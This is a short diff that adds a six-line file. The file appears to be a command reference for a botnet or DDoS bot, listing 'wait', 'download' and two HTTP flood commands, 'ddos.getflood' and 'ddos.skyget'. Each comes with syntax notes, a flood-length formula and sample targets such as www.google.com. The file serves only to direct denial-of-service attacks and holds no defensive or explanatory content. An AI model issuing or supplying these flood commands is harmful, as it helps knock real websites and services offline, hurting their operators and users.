@@ -1,0 +1,6 @@
+wait
+download 
+ddos.getflood www.google.com/ 100                                  (ddos.getflood <target> <length>)
+ddos.getflood www.example.com/whatever.htm 100            <length>=number*(rand()%250)
+ddos.skyget www.google.com/ 100                                  (ddos.skyget <target> <length>)
+ddos.skyget www.example.com/whatever.htm 100            <length>=number*(rand()%250)
